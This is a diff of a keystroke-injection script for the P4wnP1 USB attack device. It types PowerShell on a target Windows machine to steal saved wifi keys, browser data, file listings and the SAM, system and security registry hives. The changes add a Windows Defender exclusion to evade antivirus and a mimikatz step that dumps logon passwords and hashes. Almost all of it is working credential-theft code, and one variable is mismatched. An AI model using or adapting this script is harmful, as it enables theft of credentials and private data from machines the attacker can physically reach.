@@ -1,7 +1,7 @@
 /*#########################################################################################################################################\
 # AllinOne_extraction.js                                                                                                                   #
 #   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs       #
-#   and Windows credential databases (SAM, system and security files).                                                                     #
+#   and Windows credential databases (SAM, system and security files) to P4wnP1 mass storage.                                              #
 #                                                                                                                                          #
 #   Author: chriskalv                                                                                                                      #
 #                                                                                                                                          #
@@ -16,12 +16,13 @@
 // GENERAL                                                         // ---
 layout("de");                                                      // Keyboard layout
 typingSpeed(0,0);                                                  // Typing = really fast
-run_as_admin=false;                                                // Set to true to execute powershell as Administrator (normally not necessary)
+run_as_admin=false;                                                // Set to true to execute powershell as Administrator
 hide=false;                                                        // Set to true to hide the console window on the target
 exit=true;                                                         // Set to true to exit the console once finished
+modify_defender=false;                                             // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
 var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
 // FILES EXTRACTION                                                // ---
-extract_files=true;                                                // Set to true to enable the extraction of files
+extract_files=false;                                               // Set to true to enable the extraction of files
 extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
 var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
@@ -35,8 +36,10 @@ var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String th
 extract_browserdata=false;                                         // Set to true to enable the extraction of browser data (history, bookmarks, logs)
 // HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION                // ---
 extract_folderstructure=true;                                      // Set to true to enable the extraction of the home directory folder/files structure
+// LOGON USERS & PASSWORD EXTRACTION                               // ---
+extract_mimikatz=false;                                            // Set to true to extract users and passwords (hashes) with mimikatz. Might be problematic to execute if AntiVir is active on the target system.
 // WINDOWS CREDENTIALS EXTRACTION                                  // ---
-extract_wincreds=false;                                            // Set to true to enable the extraction of Windows credentials dbs (powershell must be run as admin)
+extract_wincreds=false;                                            // Set to true to enable the extraction of Windows credentials dbs (Powershell must be run as Administrator for this to work [run_as_admin=true]). Might be problematic to execute if AntiVir is active on the target system.
 ////////////////////////////////////////////////////////////////////
 
 // Definition of other variables, arrays, ...
@@ -72,21 +75,42 @@ function attack() {
         type("\n");
         delay(1000);
     }
-  // Create paths
+
+  // Identify path/directory names
     type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
     type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
     type("$lootfolder = 'loot_' +$timestamp;");
+  
+  // Disable Windows Defender
+  if (modify_defender && run_as_admin) {
+    type("Import-Module Defender;\n");
+    type("Set-MpPreference -ExclusionPath $usbPath;\n");
+    delay(1000)
+  }
+    
+  // Create directories
     if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");                     
     if (extract_folderstructure) type("$lootPathFolders = $usbPath+ '' +$lootfolder+ '\\folder_structure\';mkdir $lootPathFolders;");
     if (extract_browserdata) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\browser_data\';mkdir $lootPathBrowser;");
+    if (extract_mimikatz && run_as_admin) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;")
     if (extract_wifi) type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
-    if (extract_wincreds) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
+    if (extract_wincreds && run_as_admin) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
     if (extract_add_folder) type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");  
     delay(100);
   
   // Get files/folder structure of Documents, Downloads, Pictures, Videos and Recycle Bin for current user
     if (extract_folderstructure) { 
         type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $lootPathFolders\\$env:COMPUTERNAME-Documents.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $lootPathFolders\\$env:COMPUTERNAME-Pictures.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $lootPathFolders\\$env:COMPUTERNAME-Videos.txt;tree /F /A $env:USERPROFILE\\Downloads > $lootPathFolders\\$env:COMPUTERNAME-Downloads.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $lootPathFolders\\$env:COMPUTERNAME-RecycleBin.txt\n");    
+        delay(5000)
+    }
+  
+  // Get users and passwords (hashes) with mimikatz
+    if (extract_mimikatz) {
+        type("cd $usbPath;\n");
+        type("cd /tools;\n");
+        type(".\\pw.exe > $lootPathUsersPasswords\\$env:UserName`.txt -and type $lootPathUsersPasswords\\$env:UserName`.txt;\n");
+        type("privilege::debug;\n");
+        type("sekurlsa::logonPasswords full;\n"); 
         delay(5000)
     }
 
@@ -106,12 +130,12 @@ function attack() {
   // Extract Wifi information/keys
     if (extract_wifi) {
         type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");
-        type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
+        type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;\n")
         delay(2000)
     }
 	
   // Extract Windows credentials
-    if (extract_wincreds) && (run_as_admin) {
+    if (extract_wincreds && run_as_admin) {
         type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
         type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
         type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
@@ -142,8 +166,12 @@ function attack() {
             }
         }
     }
-	
-  //Exit the console if chosen to do so      
+  // Clean up
+    if (modify_defender) {
+      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
+    }
+  
+  // Exit the console if chosen to do so      
     if (exit) { type("exit\n"); }
 }
 
